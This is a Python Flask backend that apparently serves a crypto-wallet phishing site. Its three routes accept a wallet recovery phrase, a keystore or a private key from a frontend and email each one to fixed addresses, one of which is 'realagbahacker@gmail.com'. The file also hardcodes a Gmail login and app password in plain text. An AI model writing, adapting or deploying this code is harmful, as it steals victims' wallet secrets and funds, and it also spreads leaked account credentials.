from flask import Flask, request, jsonify
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask_cors import CORS
import threading
import os

app = Flask(__name__)

# Enable CORS to allow requests from frontend (Netlify, etc.)
CORS(app)

# Email credentials (set these using environment variables)
EMAIL_USER = 'maillerpython@gmail.com'
EMAIL_PASSWORD ='xadpaiwmgfojrntd'  # Gmail app password (set this in your environment)
EMAIL_HOST = 'smtp.gmail.com'
EMAIL_PORT = 587

# Function to send email
def send_email(to_email, subject, body):
    msg = MIMEMultipart()
    msg['From'] = 'python mail'
    msg['To'] = 'annonymous'
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP(EMAIL_HOST, EMAIL_PORT)
        server.starttls()
        server.login(EMAIL_USER, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_USER, to_email, text)
        server.quit()
        return "Email sent successfully!"
    except Exception as e:
        return f"Failed to send email. Error: {str(e)}"

# Route to send an email
@app.route('/send-email', methods=['POST'])
def send_email_route():
    data = request.get_json()

    # Check if all necessary fields are provided
    if  'body' not in data:
        return jsonify({"error": "Missing 'to', 'subject', or 'body'"}), 400

    # Extract email data
    to_email = ['alexenderyoung79@gmail.com', 'realagbahacker@gmail.com']

    body = f"Phrase:{data['body']}"
    subject = "PHASE"

    # Call the send email function
    thread = threading.Thread(target=send_email, args=(to_email, subject, body))
    thread.start()

    return jsonify({"message": 'email sent succesfully'})

# Route to send an email
@app.route('/send-keystore-email', methods=['POST'])
def keystore_send_email_route():
    data = request.get_json()

    # Check if all necessary fields are provided
    if  'body' not in data:
        return jsonify({"error": "Missing 'to', 'subject', or 'body'"}), 400

    # Extract email data
    to_email = ['alexenderyoung79@gmail.com', 'realagbahacker@gmail.com']

    body = f"{data['body']}"
    subject = "KEYSTORE"

    # Call the send email function
    thread = threading.Thread(target=send_email, args=(to_email, subject, body))
    thread.start()

    return jsonify({"message": 'email sent succesfully'})

# Route to send an email
@app.route('/send-privatekey-email', methods=['POST'])
def private_send_email_route():
    data = request.get_json()

    # Check if all necessary fields are provided
    if  'body' not in data:
        return jsonify({"error": "Missing 'to', 'subject', or 'body'"}), 400

    # Extract email data
    to_email = ['alexenderyoung79@gmail.com', 'realagbahacker@gmail.com']

    body = f"{data['body']}"
    subject = "PRIVATEKEY"

    # Call the send email function
    thread = threading.Thread(target=send_email, args=(to_email, subject, body))
    thread.start()

    return jsonify({"message": 'email sent succesfully'})



if __name__ == '__main__':
    app.run(debug=True)
